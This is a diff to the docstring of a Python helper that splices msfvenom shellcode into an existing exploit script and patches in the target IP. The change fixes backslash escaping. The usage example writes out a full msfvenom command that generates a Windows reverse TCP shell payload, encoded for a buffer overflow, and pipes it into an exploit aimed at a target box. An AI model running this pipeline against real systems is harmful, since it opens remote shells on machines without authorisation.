@@ -5,9 +5,9 @@ and optionally patch the hardcoded target IP in server_address.
 
 Usage (pipe msfvenom output directly):
 
-    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \\
-      LHOST=$LocalIP LPORT=4444 \\
-      -e x86/unicode_mixed BufferRegister=EAX -f python \\
+    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
+      LHOST=$LocalIP LPORT=4444 \
+      -e x86/unicode_mixed BufferRegister=EAX -f python \
       | python3 buf_swap.py /path/to/exploit.py $BoxIP
 
 Arguments:
@@ -25,7 +25,7 @@ Notes:
       buf += "\x..."
       buf += b"\x..."
   - re.sub is given a lambda replacement to prevent Python treating
-    \\x sequences in the shellcode as regex backreferences.
+    \x sequences in the shellcode as regex backreferences.
   - In Python 2, b"" and "" are identical, so msfvenom's bytes-style
     output works without modification.
 """
